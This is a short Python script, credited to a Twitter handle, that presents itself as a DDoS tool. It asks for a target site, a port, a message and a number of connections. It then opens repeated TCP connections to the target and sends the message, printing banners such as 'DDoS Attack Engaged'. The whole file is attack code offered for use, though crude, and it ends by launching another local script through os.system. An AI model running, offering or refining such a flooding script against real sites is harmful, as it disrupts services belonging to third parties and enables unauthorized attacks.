import socket
import os
import sys

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)

curdir = os.getcwd()

print("DDoS mode loaded")
print("python script made by an0nymous_nl twitter")
host = input("Site you want to DDoS: ")
port = int(input("Port you want to attack: "))
message = input("Input the message you want to send: ")
conn = int(input("How many connections you want to make: "))
ip = socket.gethostbyname(host)
print("[" + ip + "]")
print("[Ip is locked]")
print("[Attacking " + host + "]")
print("+----------------------------+")


def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send(message.encode())
        ddos.sendto(message.encode(), (ip, port))
        ddos.send(message.encode())
    except socket.error as msg:
        print("|[Connection Failed]         |")
    print("|[DDoS Attack Engaged]       |")
    ddos.close()


for i in range(1, conn):
    dos()

print("+----------------------------+")
print("The connections you requested had finished")

if __name__ == "__main__":
    answer = input("Do you want to ddos more? (y/n): ")
    if answer.strip().lower() in ["y", "yes"]:
        restart_program()
    else:
        os.system(curdir + "Deqmain.py")
